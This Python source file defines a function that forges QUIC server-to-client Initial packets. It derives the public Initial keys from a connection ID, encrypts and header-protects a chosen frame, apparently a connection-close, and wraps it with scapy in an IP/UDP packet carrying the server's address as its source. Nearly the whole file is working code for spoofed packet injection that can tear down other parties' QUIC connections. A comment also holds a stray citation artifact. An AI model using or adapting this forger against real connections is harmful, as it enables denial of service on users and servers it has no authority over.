
from scapy.layers.tls.crypto.hkdf import TLS13_HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from scapy.layers.inet import IP, UDP
from scapy.all import Raw
from typing import Tuple
from quic_protected import *
from quic_crypto import *
from aioquic.quic.packet import pull_quic_header
from aioquic.buffer import Buffer
from aioquic.quic.crypto import CryptoPair
import os

def _encode_varint_2(value: int) -> bytes:        # 2-byte QUIC varint
    # 0b01xxxxxx in the first byte (RFC 8999 §2) :contentReference[oaicite:4]{index=4}
    return bytes([(0x40 | (value >> 8) & 0x3F), value & 0xFF])


def forge_cc_scapy(
        dcid_secret: bytes,          # for HKDF
        dcid_header: bytes,          # will appear in header
        tpl: Tuple[str,int,str,int],
        frame: bytes,
        PacketNumberLen: int,
        ver = "V1",
        pn: int = 0) -> Raw:
    
    key, iv, hp = derive_initial_keys(dcid_secret,is_server=True,version=ver)

    

    # --- build header up to PN ------------------------------------
    #hdr  = bytearray(b"\xc3\x00\x00\x00\x01")          # flags + version
    #hdr = bytearray(b"\xc3") # 11 00 00 11 -> 11 final byte means pn_len == 4
    #hdr = bytearray(b"\xc1") # 11 00 00 01 -> 01 final byte means pn_len == 2 # Won't work if pn_len from client is higher.
    #hdr = bytearray(b"\xd3")
    #hdr = bytearray(b"\xc2") # 11 00 00 10 -> 10 final byte means pn_len == 3
    
    
    flag = (0xc + LONG_HEADER_TYPES["Initial"][ver]) << 4 # Long header + fixed bit + header type.
    hdr = bytearray([flag+PacketNumberLen]) # Matching the packet number len as in client intial.
    hdr += VERSION_CONSTANTS["bytes"][ver]
    hdr += bytes([len(dcid_header)]) + dcid_header     # DCID
    
    #hdr += b"\x00"                                     # SCID length = 0
    server_scid = os.urandom(8)
    hdr += bytes([len(server_scid)]) + server_scid
    #hdr += bytes([len(dcid_secret)]) + dcid_secret     # SCID
    hdr += b"\x00"                                    # Token length  = 0  ← NEW
    
    
    # --- AEAD ------------------------------------------------------
    
    
    pn_length = PacketNumberLen + 1
    body_len  = len(frame) + 16                 # 16-byte GCM tag
    length_v  = encode_varint(pn_length + body_len)
    hdr += length_v                             # **exact number of bytes**

    hdr += pn.to_bytes(pn_length, "big")           # packet number

    full_packet = bytes(hdr) + frame + (b"\x00" * 16)  # dummy tag ok for parsing
    

    buf = Buffer(data=full_packet)
    try:
        hdr_test =pull_quic_header(buf)
    except ValueError:
        print("Packet Header isn't pull_quic correct.")

    ciphertext, _ = encrypt_quic(plaintext_payload=frame, aad=hdr, key=key, iv=iv, pn=pn)
    assert len(ciphertext) == len(frame) + 16  # GCM tag
    # --- header protection ----------------------------------------
                                   
    pn_offset = len(hdr) - pn_length # start of PN
    full_pkt = bytes(hdr) + ciphertext        
    sample_start, sample_end = pn_offset+pn_length, pn_offset+pn_length+16
    hdr_unprotected = bytes(hdr)
    protect_header(hdr=hdr, pn_offset=pn_offset, pn_length=pn_length, hp_key=hp, sample=full_pkt[sample_start:sample_end])

    protected_pkt = bytes(hdr) + ciphertext
    
    cp = CryptoPair()
    cp.setup_initial(cid=dcid_secret,                # DCID that is *on the wire*
                    is_client=True,                # we are forging a server→client Initial
                    version=VERSION_CONSTANTS["int"][ver])
    try:
        plain_hdr, plain_payload, pn_out = cp.decrypt_packet(protected_pkt,             # removes HP *and* checks the GCM tag
                        pn_offset,
                        expected_packet_number=pn)
        assert plain_payload == frame
        assert pn_out == pn
        assert plain_hdr == bytes(hdr_unprotected)
    except Exception as exc:
        raise ValueError(f"Crypto validation failed: {exc}") from exc

    return (IP(src=tpl[2], dst=tpl[0]) /
            UDP(sport=tpl[3], dport=tpl[1]) /
            Raw(protected_pkt))
